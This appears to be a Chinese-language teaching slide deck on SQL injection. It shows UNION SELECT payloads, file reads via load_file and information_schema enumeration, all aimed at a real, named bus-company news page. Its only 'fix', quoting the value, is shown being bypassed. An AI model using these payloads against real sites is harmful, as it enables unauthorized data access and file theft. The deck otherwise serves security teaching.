<h1><span class="fragment highlight-current-red">SQL</span> <span class="fragment highlight-current-red">Injection</span></h1>

note: 結構化查詢語言（en:Structured Query Language，縮寫為SQL），一種程式語言，用於資料庫中的標準資料查詢語言，IBM公司最早使用在其開發的資料庫系統中。1986年10月，美國國家標準學會（ANSI）對SQL進行規範後，以此作為關聯式資料庫管理系統的標準語言（ANSI X3. 135-1986），1987年得到國際標準組織的支援下成為國際標準。不過各種通行的資料庫系統在其實踐過程中都對SQL規範作了某些編改和擴充。所以，實際上不同資料庫系統之間的SQL不能完全相互通用。

SQL攻擊（SQL injection，中國大陸稱作SQL注入攻擊，港澳稱作），簡稱隱碼攻擊，是發生於應用程式之資料庫層的安全漏洞。簡而言之，是在輸入的字串之中夾帶SQL指令，在設計不良的程式當中忽略了檢查，那麼這些夾帶進去的指令就會被資料庫伺服器誤認為是正常的SQL指令而執行，因此遭到破壞。
有部份人認為SQL隱碼攻擊是只針對Microsoft SQL Server而來，但只要是支援批次處理SQL指令的資料庫伺服器，都有可能受到此種手法的攻擊。


#### SELECT name FROM users WHERE id = '123';

![](img/blind.jpg)

[1 分鐘了解關聯式資料庫](https://docs.google.com/spreadsheets/d/1Oc2nrT9yFGGuB4ZaoIwTva1OMZCuEASGKdNIN2nXU3k/edit?usp=sharing) <!-- .element: class="fragment" -->

note: 用 ukik 當例子，要示範到 where


http://www.tpebus.com.tw/newsfile/shownews.php?newsno=596
note: 看到這段網址不知道各位有什麼感覺？毫無反應，就只是個網址。你可能會想說這就是一個網址而已，後面那個 596 應該是某篇文章的 ID 吧。


# 駭客想的不一樣


http://www.tpebus.com.tw/newsfile/shownews.php?<span class="fragment highlight-red">newsno=596</span>

SQL <!-- .element: class="fragment" -->
```sql
SELECT * FROM news WHERE id='596';
```
<!-- .element: class="fragment" -->

PHP <!-- .element: class="fragment" -->
```php
sql_string = "SELECT * FROM news WHERE id=596;"
```
<!-- .element: class="fragment" -->

```php
sql_string = "SELECT * FROM news WHERE id=" + "596" + ";"
```
<!-- .element: class="fragment" -->

```php
sql_string = "SELECT * FROM news WHERE id=" + newsno + ";"
```
<!-- .element: class="fragment" -->

---

# 攻
## UNION SELECT


```sql
mysql> SELECT id,email,name FROM users WHERE id=1;
+----+-------------------+------------+
| id | email             | name       |
+----+-------------------+------------+
|  1 | kcheart@gmail.com | Kevin Chen |
+----+-------------------+------------+
```

```sql
mysql> SELECT id,email,name FROM users WHERE id=1 UNION ALL SELECT 'a','b','c';
+----+-------------------+------------+
| id | email             | name       |
+----+-------------------+------------+
| 1  | kcheart@gmail.com | Kevin Chen |
| a  | b                 | c          |
+----+-------------------+------------+
```
<!-- .element: class="fragment" -->

```sql
mysql> SELECT id,email,name FROM users WHERE id=-1 UNION ALL SELECT 'a','b','c';
+----+-------+------+
| id | email | name |
+----+-------+------+
| a  | b     | c    |
+----+-------+------+
```
<!-- .element: class="fragment" -->

note: UNION 操作符用於合併兩個或多個 SELECT 語句的結果集。
請注意，UNION 內部的 SELECT 語句必須擁有相同數量的列。列也必須擁有相似的數據類型。同時，每條 SELECT 語句中的列的順序必須相同。

通常一個 select 會伴隨一個結果，而 UNION 可以加油添醋。


http://www.tpebus.com.tw/newsfile/shownews.php?newsno=596

```sql
SELECT * FROM news WHERE id='596';
```
<!-- .element: class="fragment" -->

```php
sql_string = "SELECT * FROM news WHERE id=" + newsno + ";"
```
<!-- .element: class="fragment" -->

<span class="fragment">http://www.tpebus.com.tw/newsfile/shownews.php?newsno=<span class="fragment highlight-red">596%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14</span></span>

```sql
SELECT * FROM news WHERE id=596 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14;
```
<!-- .element: class="fragment" -->

---

# 然後勒？
note: 其實這樣很空虛啊，我們來玩點有趣的


## MySQL functions

* version() - 回傳資料庫版本
* database() - 取得當前資料庫
* load_file('/etc/xxx') - 讀檔 <!-- .element: class="fragment highlight-red" -->
* concat('aaa', 'bbb', version(), 'ccc') - 連接字串

```sql
SELECT * FROM news WHERE id=596 UNION SELECT 1,2,version(),4,5,6,7,8,9,10,11,12,13,14;
```
<!-- .element: class="fragment" -->
note: 現場示範


# 找出 Schema


```sql
SELECT table_schema,table_name,column_name FROM information_schema.columns;
```

note: 要有個概念，一台電腦只能安裝一個 mysql，一個 mysql 可以有很多 database，一個 database 有很多 table，一個 table 有很多 column。

在 mysql 裡面有一個特別的 database

    UNION SELECT 1,2,concat(table_name,0x2e,column_name),4,5,6,7,8,9,10,11,12,13,14 FROM information_schema.columns WHERE table_schema='linelist1' LIMIT 1 OFFSET 0


# 找出 Data


```sql
SELECT column_name FROM table_name;
```

---

# 防
### 程式安全


修改前
```php
sql_string = "SELECT * FROM news WHERE id=" + newsno + ";"
```

修改後 <!-- .element: class="fragment" -->
```php
sql_string = "SELECT * FROM news WHERE id='" + newsno + "';"
```
<!-- .element: class="fragment" -->

SQL <!-- .element: class="fragment" -->
```SQL
SELECT * FROM news WHERE id='-596 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14';
```
<!-- .element: class="fragment" -->

---

# 攻
### 填空遊戲


-596 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14 <!-- .element: class="fragment" -->

```SQL
SELECT * FROM news WHERE id='-596 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14';
```
<!-- .element: class="fragment" -->

' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14 /* <!-- .element: class="fragment" -->

```SQL
SELECT * FROM news WHERE id='' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14 /*';
```
<!-- .element: class="fragment" -->

![](img/rage.png) <!-- .element: class="fragment" -->

---

# 結論
# 無論攻防 <!-- .element: class="fragment" -->
## 程式能力的考驗 <!-- .element: class="fragment" -->

---

# Q & A
### 想發問請舉手